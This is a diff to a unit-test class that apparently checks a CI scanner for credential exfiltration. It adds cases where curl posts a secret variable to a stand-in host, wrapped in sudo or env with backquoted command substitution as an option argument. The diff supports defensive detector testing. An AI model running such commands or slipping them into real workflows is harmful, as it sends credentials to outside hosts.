@@ -6508,6 +6508,10 @@ class CICredentialEgress(unittest.TestCase):
             'env -C 1dir curl -d "$T" https://example.invalid/x',
             'timeout -k 5s 30 curl -d "$T" https://example.invalid/x',
             'nice -n 5 curl -d "$T" https://example.invalid/x',
+            # a backquoted word as an option's argument, alone or with more after it (#850's second review)
+            'sudo -u `whoami` curl -d "$T" https://example.invalid/x',
+            'env -C `pwd`/dist curl -d "$T" https://example.invalid/x',
+            'sudo -u `whoami` -E curl -d "$T" https://example.invalid/x',
         )], held=True)
         self.assert_a061([(wf, "run: " + c) for c in (
             'test -n "$T" || echo "curl -d $T https://example.invalid/x"',
@@ -6526,6 +6530,8 @@ class CICredentialEgress(unittest.TestCase):
             '/usr/bin/env bash -c \'curl -d "status=ok" https://example.invalid/x\'',
             'zsh -c \'curl -H "Authorization: Bearer $T" https://example.invalid/x\'',
             'sudo -u 1000:1000 curl -d "status=ok" https://example.invalid/x',
+            'sudo -u `whoami` curl -d "status=ok" https://example.invalid/x',
+            'env -C `pwd`/dist curl -H "Authorization: Bearer $T" https://example.invalid/x',
         )], held=False)
 
     def test_environment_dumps_and_encoded_secrets_piped_to_an_upload_are_held(self):
